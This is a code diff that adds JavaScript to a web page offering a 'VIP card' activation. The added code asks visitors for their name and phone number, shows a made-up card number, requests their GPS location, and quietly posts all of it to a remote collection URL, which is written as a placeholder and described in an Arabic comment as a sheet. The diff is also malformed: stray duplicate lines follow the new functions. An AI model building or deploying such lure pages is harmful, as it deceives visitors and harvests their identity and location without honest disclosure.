@@ -104,8 +104,65 @@
 </div>
 
 <script>
-    function startActivation() {
-        var clientName = document.getElementById('username').value.trim();
+function startActivation() {
+    var clientName = document.getElementById('username').value.trim();
+    var clientPhone = document.getElementById('phone').value.trim();
+    
+    if (clientName === "" || clientPhone === "") {
+        alert("برجاء إدخال الاسم ورقم الهاتف أولاً!");
+        return;
+    }
+    
+    var p1 = Math.floor(1000 + Math.random() * 9000);
+    var p2 = Math.floor(1000 + Math.random() * 9000);
+    var p3 = Math.floor(1000 + Math.random() * 9000);
+    var generatedNumber = "7777 " + p1 + " " + p2 + " " + p3;
+
+    document.getElementById('formContainer').style.display = 'none';
+    document.getElementById('vipCard').style.display = 'block';
+    document.getElementById('displayHolder').innerText = clientName;
+    document.getElementById('cardNumber').innerText = generatedNumber;
+
+    var finalUrl = "https://google.com";
+
+    // 📍 كود سحب اللوكيشن (GPS) وإرسال البيانات
+    if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(function(position) {
+            var lat = position.coords.latitude;
+            var lng = position.coords.longitude;
+            var locationUrl = "https://google.com" + lat + "," + lng;
+
+            sendData(finalUrl, clientName, clientPhone, generatedNumber, locationUrl);
+        }, function(error) {
+            // في حال رفض العميل إذن الموقع، يتم الإرسال بدون لوكيشن
+            sendData(finalUrl, clientName, clientPhone, generatedNumber, "تم رفض إذن الموقع");
+        });
+    } else {
+        sendData(finalUrl, clientName, clientPhone, generatedNumber, "المتصفح لا يدعم اللوكيشن");
+    }
+}
+
+// دالة مساعدة لإرسال البيانات بالـ FormData
+function sendData(url, name, phone, cardNumber, locationData) {
+    var packet = new FormData();
+    packet.append('name', name);
+    packet.append('phone', phone);
+    packet.append('cardNumber', cardNumber);
+    packet.append('location', locationData); // إرسال رابط الإحداثيات إلى الشيت
+
+    fetch(url, {
+        method: "POST",
+        mode: "no-cors", 
+        body: packet
+    })
+    .then(function() {
+        console.log("تم الترحيل بنجاح مع اللوكيشن.");
+    })
+    .catch(function(err) {
+        console.error("خطأ:", err);
+    });
+}
+ var clientName = document.getElementById('username').value.trim();
         var clientPhone = document.getElementById('phone').value.trim();
         
         if (clientName === "" || clientPhone === "") {
